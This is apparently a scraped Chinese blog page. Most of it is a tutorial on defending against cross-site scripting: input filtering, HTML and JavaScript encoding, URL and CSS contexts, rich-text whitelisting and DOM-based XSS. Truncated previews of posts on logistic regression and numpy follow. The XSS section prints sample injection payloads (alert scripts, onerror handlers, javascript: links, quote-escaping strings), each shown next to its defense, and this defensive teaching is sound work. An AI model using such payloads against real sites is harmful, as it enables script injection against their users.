<p>Django(Python)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HttpResponse.set_cookie(key, value=<span class="string">''</span>, max_age=<span class="keyword">None</span>, expires=<span class="keyword">None</span>, path=<span class="string">'/'</span>, domain=<span class="keyword">None</span>, secure=<span class="keyword">None</span>, httponly=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
<h2 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h2><p>常见的Web漏洞如XSS，SQL注入等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。</p>
<p>输入检查大体上可以被处理为白名单的方式，让一些基于特殊字符的攻击失效。</p>
<p>输入检查的逻辑，必须放在服务器端的代码实现。如果只是在客户端使用Javascript进行输入检查，是很容易被攻击者绕过的。目前来说是同时在客户端和服务器端实现相同的输入检查，客户端的JavaScript检查就可以阻挡大部分误操作的正常用户，从而节省服务器资源了。</p>
<p>在XSS防御上，输入检查一般是检查用户输入的数据是否包含一些特别字符，比如&lt;、&gt;、’、等。如果发现这些字符，则将这些字符过滤或者转码。比较智能的输入检查还会匹配XSS特征，比如查找用户是否包含了<code>&lt;script&gt;</code>、<code>javascript</code>等敏感词汇。</p>
<p>XSS Filter在用户提交数据的时候就会获取变量，并进行XSS检查，但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。</p>
<p>比如下面的XSS漏洞：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$var"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>$var</code>是用户可以控制的变量，用户只要提交一个恶意脚本所在的URL地址，就可以实施XSS攻击。</p>
<p>如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，只能看到用户提交的一个URL，就很有可能误报，因为在大多数情况下，URL是一个合法的用户数据（比如个人主页）。</p>
<p>XSS Filter还有一个问题就是其会对<code>&lt;</code>、<code>&gt;</code>等字符处理，改变用户数据的语义。</p>
<p>这样发现了敏感字符就会粗暴的过滤或者替换<code>&lt;</code>，就很有可能改变用户的原意。同时输入数据还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一替换操作，则可能出现问题。</p>
<p>比如针对用户的昵称，不同的场景可能是不同的，展示的需求也不相同，如果在输入的地方统一对数据做了变更，那么展示的时候，也会出现一些转义字符的乱入。</p>
<p>用户的输入昵称如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$nickname=’I am <span class="string">"hero"</span>‘</div></pre></td></tr></table></figure></p>
<p>这里在XSS Filter中对双引号进行转义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$nickname = <span class="string">'I am \"hero\"'</span></div></pre></td></tr></table></figure></p>
<p>而这里在HTML展示的时候就会出现<code>\</code>这个字符。这显然是不合适的。</p>
<h2 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h2><p>一般来说，出了富文本的输出外，在变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击。</p>
<h3 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h3><p>编码分为很多种，针对HTML代码的编码方式是<code>HtmlEncode</code>。</p>
<p>HtmlEncode并非专有名词，他只是一中函数实现，其能够将字符转换为<code>HTMLEntities</code>，对应的标准是ISO-8859-1。</p>
<p>为了对抗XSS，<code>HtmlEncode</code>中要求转换下面的字符：</p>
<p><table border="0" cellspacing="0"><colgroup span="3" width="85"></colgroup></p>
<p><tbody></p>
<p><tr style="height: 22.3594px;"></p>
<p><td style="text-align: center;" align="left">&amp;</td></p>
<p><td style="text-align: center;" align="left">&amp;</td></p>
<p><td style="text-align: center;" align="left"></td><br></tr></p>
<p><tr style="height: 22px;"></p>
<p><td style="text-align: center;" align="left">&lt;</td></p>
<p><td style="text-align: center;" align="left">&lt;</td></p>
<p><td style="text-align: center;" align="left"></td><br></tr></p>
<p><tr style="height: 22px;"></p>
<p><td style="text-align: center;" align="left">&gt;</td></p>
<p><td style="text-align: center;" align="left">&gt;</td></p>
<p><td style="text-align: center;" align="left"></td><br></tr></p>
<p><tr style="height: 22px;"></p>
<p><td style="text-align: center;" align="left">“</td></p>
<p><td style="text-align: center;" align="left">&quot;</td></p>
<p><td style="text-align: center;" align="left"></td><br></tr></p>
<p><tr style="height: 22px;"></p>
<p><td style="text-align: center;" align="left">‘</td></p>
<p><td style="text-align: center;" align="left">&#x27;</td></p>
<p><td style="text-align: center;" align="left"></td><br></tr></p>
<p><tr style="height: 110px;"></p>
<p><td style="text-align: center;" align="left">/</td></p>
<p><td style="text-align: center;" align="left">&#x2F;</td></p>
<p><td style="text-align: center;" align="left">包含反斜线是因为他可能会闭合一些HTML entity</td><br></tr><br></tbody><br></table><br>在PHP中有<code>htmlentities()</code>和<code>htmlspecialchars()</code>两个函数可以满足要求。</p>
<p>相应的，Javascript的编码方式还可以使用<code>JavascriptEncode</code>。<code>JavascriptEncode</code>和<code>HtmlEncode</code>的编码方法不同，他需要使用<code>\</code>对特殊字符进行转义。在对抗XSS的时候，还要求输出的变量必须在引号外部。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = escapeJavascript($evil);</div><div class="line"></div><div class="line"><span class="keyword">var</span> y =<span class="string">'"'</span>+ escapeJavascript($evil)+<span class="string">'"'</span>;</div></pre></td></tr></table></figure></p>
<p>如果<code>escapeJavascript()</code>函数仅转义了几个危险的字符，那么上面两行的代码输出之后就会变成<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = <span class="number">1</span>;alert(<span class="number">2</span>);</div><div class="line"><span class="keyword">var</span> x = <span class="string">"1;alert(2)"</span>;</div></pre></td></tr></table></figure></p>
<p>那么说明第二行才是安全的，攻击者即使想要逃逸出引号的范围也会出现困难：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> y = <span class="string">"\";alert(1);\/\/"</span>;</div></pre></td></tr></table></figure></p>
<p>所以要求<code>javascriptEncode</code>的变量输出一定要在引号前。</p>
<p>当然也可以使用一个更加严格的<code>JavascriptEncode</code>函数来保证安全，除了数字、字母以外的所有自负都使用<code>\xHH</code>的方法进行编码，这样就能保证代码安全。</p>
<p>除了<code>HtmlEncode</code>、<code>JavascriptEncode</code>还有许多用于各种情况的编码函数，比如<code>XMLEncode</code>和<code>JSONEncode</code>。在适当条件下选用适当的函数。需要注意的是，编码后的数据长度可能会发生改变，从而影响某些功能。</p>
<p>当然XSS是一个很复杂的问题，需要在正确的地方使用正确的编码方式。比如下面的情况：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=<span class="string">"alert('&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>对于浏览器来说，<code>htmlparser</code>会优先于<code>JavaScript Parser</code>执行，所以解析的过程是，被<code>HtmlEncode</code>的字符先被解码，然后执行<code>Javascript</code>事件。</p>
<p>因此经过<code>htmlparser</code>解析后相当于：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=<span class="string">"alert('');alert('2');"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样就成功的在<code>onclick</code>事件中注入了代码。导致XSS攻击发生的原因就是没有分清楚输出变量的语境，因此并非在模板引擎之中使用了auto-escape就万事大吉了，XSS的防御需要区别情况对待。</p>
<h1 id="正确防御XSS"><a href="#正确防御XSS" class="headerlink" title="正确防御XSS"></a>正确防御XSS</h1><p>XSS本质还是一种HTML注入，用户的数据被当成了HTML代码的一部分来执行，从而混淆了原本的语义，产生了新的语义。</p>
<p>如果网站使用了MVC架构，那么XSS就发生在View层，在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是真正发生攻击的地方做防御。</p>
<p>下面用<code>$var</code>表示用户数据，他将被填充入HTML代码中。可能存在以下场景：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>所有在标签中输出的变量，如果没有做任何处理，都能导致直接产生XSS。</p>
<p>在这种场景下，XSS的利用方式一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能产生脚本的方式：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>防御的方法就是对变量使用<code>HtmlEncode</code>。</p>
<h2 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h2><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">"$var"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>和HTML标签中输出类似，可能的攻击方法就是构造”来闭合属性，从而攻击：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">""</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>防御的方法仍然是<code>HtmlEncode</code>。</p>
<p>在OWASP ESAPI中推荐了一种更为严格的<code>HtmlEncode</code> —— 除了字母、数字外，其他所有的特殊字符都被编码成了<code>HTMLEntities</code>。</p>
<h2 id="在标签输出"><a href="#在标签输出" class="headerlink" title="在标签输出"></a>在<script>标签输出</h2><p>在script标签输出的时候，首先应该确保的是变量在引号之中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> x=<span class="string">"$var"</span></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>攻击者需要先闭合引号才能实施攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var x=&quot;&quot;;alert(/xss/);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>防御的时候使用<code>JavascriptEncode</code>。</p>
<h2 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h2><p>和<code>&lt;script&gt;</code>标签中输出类似<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('$var')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>可能的攻击方法有：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA(‘’);alert(/xss/);//')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>防御的时候使用<code>JavascriptEncode</code>。</p>
<h2 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h2><p>一般来说应该尽可能的禁止用户在<code>&lt;style&gt;</code>、HTML标签的<code>style</code>属性以及CSS文件中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的<code>encodeForCSS()</code>函数。除了字母数字外所有字符都被编码成十六进制”<code>\uHH</code>“。</p>
<h2 id="在地址中输出"><a href="#在地址中输出" class="headerlink" title="在地址中输出"></a>在地址中输出</h2><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test=$var"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，使用<code>URLEncode</code>即可。<code>URLEncode</code>会把字符转换为<code>%HH</code>的形式，比如空格就是<code>%20</code>，<code>&lt;</code>就是<code>%3c</code>。</p>
<p>可能的攻击方法：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test="</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>""&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>但是还有一种情况，就是整个URL能够被用户完全控制。这个时候URL的Protocal和Host部分是不可以使用<code>URLEncode</code>的，否则就会改变URL的语义。</p>
<p>一个URL的组成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[Protocal][Host][Path][Search][Hash]</div></pre></td></tr></table></figure></p>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">https://www.evil.com/a/b/c/test?abc=123#sssss</div><div class="line">[Protocal] = https://</div><div class="line">[Host] = www.evil.com</div><div class="line">[Path] = /a/b/c/test</div><div class="line">[Search] = ?abc=123</div><div class="line">[Hash] = #sssss</div></pre></td></tr></table></figure></p>
<p>在Protocal与Host中，如果使用<code>URLEncode</code>函数，则需要把<code>://</code>、<code>.</code>都编码掉。</p>
<p>对于下面的输出方式：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$var"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>攻击者可能会构造伪协议进行攻击：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1);"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>除了<code>javascript</code>作为伪协议执行代码以外，还有<code>vbscript</code>、<code>dataURI</code>等伪协议可以执行脚本。</p>
<p>一般来说，如果变量是整个URL，则应该先检查变量是否以<code>http</code>开头，则保证不会出现出现伪协议类的XSS攻击。在此之后，再对<code>URLEncode</code>，则可以保证不会有此类的XSS发生了。</p>
<h2 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h2><p>有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为富文本。比如一个用户在论坛在论坛中发帖，帖子中的内容要有图片、视频、表格等，这些富文本的效果都需要HTML代码来实现。</p>
<p>所以这个核心还是输入检查，输入检查的主要问题是：检查时还不知道变量的输出语境。但用户提交的富文本数据，其语义是完整的HTML代码，在输出的时候也不会拼接到某个标签的属性中，所以可以特殊情况特殊处理。</p>
<p>在过滤富文本的时候，事件应该是被严格禁止，因为富文本的展示需求不应该包含事件这种动态效果。而一些危险的标签，比如<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;form&gt;</code>都是应该严格禁止的。</p>
<p>在标签的选择上，应该选择白名单，避免使用黑名单。比如，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较安全的标签存在。</p>
<p>白名单原则不仅仅用于标签的选择，同样应该用于属性与事件的选择。同时在富文本过滤中，处理CSS也是一件很麻烦的事情，如果允许用户自定义CSS、style，则也可能导致XSS攻击。因此应该尽可能禁止用户自定义CSS与style。如果一定要允许用户自定义样式的话，那么只能像过滤富文本那样过滤CSS，者需要一个CSS Parser对样式进行智能分析，检查其中是否包含了危险代码。</p>
<p>Anti-Samy是OWASP上一个开元项目，也是目前比较好的XSS Filter。最早他是基于Java的，现在已经扩展到.NET语言。PHP之中，还有另一个项目：<code>HTMLPurify</code>。</p>
<h2 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h2><p>DOM Based XSS是一个非常特别的XSS漏洞，需要特别对待：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</div><div class="line">		<span class="built_in">document</span>.getElementById(<span class="string">'t'</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"'&gt;testLink&lt;/a&gt;"</span>;</div><div class="line">	&#125;</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test();"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
<p>在<code>button</code>的<code>onclick</code>事件，执行了<code>test()</code>函数，则非常关键的一句是：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">'t'</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"'&gt;testLink&lt;/a&gt;"</span>;</div></pre></td></tr></table></figure></p>
<p>将HTML代码写入了DOM节点，最终导致了XSS的发生。</p>
<p>事实上，DOM Based XSS是从Javascript中输出数据到HTML页面，而前文中提到的方法都是针对从服务器应用直接输出到HTML页面的XSS漏洞，因此并不适用于DOM Based XSS。</p>
<p>那么我们还是说一下下面的情况：</p>
<p>假设这里为了保护变量，服务器端直接进行<code>JavascriptEscape</code>，但是在<code>document.write</code>的时候，仍然能够产生XSS。</p>
<p>原因在于，第一次执行javascriptEscape后，只保护了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var x = &quot;$var&quot;;</div></pre></td></tr></table></figure></p>
<p>但是当document.write输出到HTML页面的时候，浏览器重新渲染了页面，在<script>标签执行时，已经对变量x进行了解码，然后在运行的时候就会被XSS。</p>
</script></p>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/14/logistic-e5-9b-9e-e5-bd-92/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/14/logistic-e5-9b-9e-e5-bd-92/" itemprop="url">Logistic回归</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-14T14:07:05+08:00">
                2016-05-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index">
                    <span itemprop="name">Python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们会在这里介绍最优化算法。</p>
<p>假设现在有一些数据点，我们用一条曲线对其进行拟合，这个拟合过程就叫做回归。利用Logistic回归进行分类的主要思想是：根据现有的数据对分类边界建立回归公式，并由此进行分类。训练分类器时的做法就是寻找最佳的拟合参数，使用的是最优化算法，接下来介绍这个而值型输出分类器的数学原理。</p>
<h1 id="Logistics回归的一般过程"><a href="#Logistics回归的一般过程" class="headerlink" title="Logistics回归的一般过程"></a>Logistics回归的一般过程</h1><ol>
<li>收集数据</li>
<li>准备数据：需要进行距离计算，所以要求数据类型为数值型</li>
<li>分析数据</li>
<li>训练算法：大部分时间将用于训练，训练的目的是找到最佳的分类回归系数</li>
<li>测试算法</li>
<li>使用算法：我们需要输入一些数据，并将其转换为对应的结构化数值，接着，给予训练好的回归系数就可以对这些数值进行简单的回归计算，判定它们属于哪个类别，然后就可以在输出的类别上做一些其他的分析工作。</li>
</ol>
<h2 id="基于Logistic回归和Sigmoid函数的分类"><a href="#基于Logistic回归和Sigmoid函数的分类" class="headerlink" title="基于Logistic回归和Sigmoid函数的分类"></a>基于Logistic回归和Sigmoid函数的分类</h2><h3 id="基于Logistics回归的优缺点"><a href="#基于Logistics回归的优缺点" class="headerlink" title="基于Logistics回归的优缺点"></a>基于Logistics回归的优缺点</h3><p>优点：计算代价不高，易于理解和实现</p>
<p>缺点：容易欠拟合，分类精度可能不高</p>
<p>适用的数据类型：数值型和标称型数据</p>
<p>所以这里我们需要的函数应该是能够接受所有的输入并且预测出类别。例如，在两个类的情况下，上述函数输出0或者1，这就是海维赛德阶跃函数（heaviside step function），或者直接称之为单位阶跃函数。这里我们常常适用<code>sigmoid</code>函数来取代海维赛德阶跃函数，<code>sigmoid</code>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/05/14/logistic-e5-9b-9e-e5-bd-92/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/05/09/numpy-e5-85-a5-e9-97-a8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/05/09/numpy-e5-85-a5-e9-97-a8/" itemprop="url">Numpy入门</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-09T19:00:33+08:00">
                2016-05-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index">
                    <span itemprop="name">Python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久都没有用过numpy来做科学计算了，现在Python的机器学习这么火，而机器学习很多代码都需要用numpy、scipy来构建，所以我现在开始进行一些温习吧</p>
<h1 id="ndarray对象"><a href="#ndarray对象" class="headerlink" title="ndarray对象"></a>ndarray对象</h1><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>我们需要创建数组并且对其进行操作。</p>
<p>我们可以通过给array函数传递python的序列对象创建数组，如果传递的是多层嵌套序列，将创建多维数组。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a = numpy.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])<span class="comment"># the list can be replaced with tuple</span></div><div class="line">b = numpy.array((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</div><div class="line">c = numpy.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],</div><div class="line">                [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],</div><div class="line">                [<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]])</div></pre></td></tr></table></figure></p>
<p> 数组的类型可以通过dtype来获取：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> c.dtype</div><div class="line">int64</div></pre></td></tr></table></figure></p>
<p> 数组的大小可以通过shape获得或者修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> a.shape,c.shape</div><div class="line">(<span class="number">4</span>,) (<span class="number">3</span>, <span class="number">4</span>)</div></pre></td></tr></table></figure></p>
